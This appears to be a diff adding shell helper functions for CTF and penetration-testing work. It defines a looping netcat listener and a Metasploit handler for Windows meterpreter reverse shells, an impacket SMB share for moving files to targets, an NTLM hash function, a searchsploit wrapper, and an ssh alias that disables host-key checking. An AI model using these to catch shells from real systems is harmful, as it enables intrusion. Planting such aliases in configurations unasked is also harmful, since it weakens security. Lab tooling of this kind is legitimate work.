@@ -1,0 +1,74 @@
+# Less finicky SSH for often-changing CTF targets and such.
+alias ssh='ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no"'
+
+# URL-encode multi-line input.
+ue() {
+    local tmp=$(mktemp)
+    $EDITOR "$tmp"
+    input=$(<"$tmp") && rm $tmp
+    # Encode the input to base64 to safely handle special characters
+    encoded_input=$(echo -n "$input" | base64)
+    # Decode the input in Python and URL-encode it
+    python -c "import urllib.parse; import base64; print(urllib.parse.quote(base64.b64decode('''$encoded_input''').decode('utf-8')))"
+}
+
+ncl() { clear; while true; do rlwrap nc -lnvp $1 ; sleep 1; done }
+
+# Windows MSF listener for staged payloads.
+ml() {
+  local ip=$(ip addr show tun0 | grep 'inet ' | head -n1 | awk '{print $2}' | cut -d/ -f1)
+  local port=$1
+  local payload='windows/x64/meterpreter/reverse_tcp'
+  echo "Payload: ${payload}"
+  echo "Port: ${port}"
+  echo "Starting msfconsole..."
+  sudo msfconsole -q -x "use multi/handler;set payload ${payload};set LHOST ${ip};set LPORT ${1};set ExitOnSession false; run -j;"
+}
+
+smbshare() {
+  if which impacket-smbserver; then {
+    local ip=$(ip addr show tun0 | grep 'inet ' | head -n1 | awk '{print $2}' | cut -d/ -f1)
+    local namelist="/usr/share/wordlists/seclists/Usernames/Names/names.txt"
+    if [[ -f "${namelist}" ]]; then
+      user="$(shuf -n1 ${namelist})"
+    else
+      user="portia"  # Default username if names.txt doesn't exist.
+    fi
+    local pass="$(openssl rand -hex 20)"
+    local dir="${HOME}/smbshare"
+    echo "Serving from ${dir}:"
+    ls -lah "${dir}"
+    echo -e "\nTo mount from target:\n"
+    echo "   net use x: \\\\${ip}\\share /user:${user} ${pass}"
+    echo
+    impacket-smbserver share -smb2support "${dir}" -user "${user}" -password "${pass}"
+  }
+  else
+    echo "Missing: impacket-smbserver" >&2
+  fi
+}
+
+pw2ntlm() {
+  echo -n $1 | iconv -t utf16le | openssl dgst -md4 -r | awk '{print$1}'
+}
+
+# (s)earch for (ex)ploits, a wrapper around `searchsploit`.
+sex() {
+  if [[ -z "$1" ]]; then
+    echo "Usage: sex <search term> or sex <options> <edb-id>"
+    return 1
+  fi
+
+  if [[ ${1:0:1} == '-' ]]; then
+    # If the first argument is a flag, don't do anything special.
+    searchsploit $@
+  else
+    # If the first arg is a non-flag parameter, assume it's a search term and format the results
+    # in a more useful way than the default.
+
+    if ! command -v jq &> /dev/null; then
+      echo "jq is required but not installed. Please install jq."; return 1
+    fi
+    searchsploit $1 ${@:2} -j | jq -r '.RESULTS_EXPLOIT[] | "\(.Date_Published) \(.Type) \(.["EDB-ID"]) \(.Title) \(.Platform)"' | sort
+  fi
+}
